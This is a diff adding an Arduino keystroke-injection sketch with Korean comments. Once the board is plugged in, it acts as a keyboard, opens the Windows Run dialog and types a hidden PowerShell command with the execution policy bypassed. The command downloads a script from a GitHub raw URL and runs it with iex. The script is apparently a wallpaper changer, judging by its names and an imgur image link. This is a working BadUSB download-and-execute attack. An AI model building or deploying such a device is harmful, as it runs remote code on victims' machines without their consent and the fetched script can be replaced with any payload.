@@ -1,0 +1,29 @@
+#include "Keyboard.h"
+
+void setup() {
+  // 아두이노 시작 후 2초 대기
+  delay(2000);
+  // 키보드 제어 시작
+  Keyboard.begin();
+  // 윈도우 + R 키 조합
+    Keyboard.press(KEY_LEFT_GUI);  // 윈도우 키 누르기
+  Keyboard.press('d');           // r 키 누르기
+  Keyboard.releaseAll();         // 모든 키 떼기
+  delay(500);
+  Keyboard.press(KEY_LEFT_GUI);  // 윈도우 키 누르기
+  Keyboard.press('r');           // r 키 누르기
+  Keyboard.releaseAll();         // 모든 키 떼기
+  delay(100);
+  // 타이핑
+  Keyboard.print("powershell -w h -NoP -NonI -Exec Bypass $url='https://i.imgur.com/3E1zOoW.jpeg';irm raw.githubusercontent.com/delta66633/backgroundreplacement/main/backgroundimagechange.ps1 | iex");
+  delay(100);
+  // 엔터 키
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  // 키보드 제어 종료
+  Keyboard.end();
+}
+
+void loop() {
+  // 여기서 아무것도 하지 않아도 됩니다.
+}
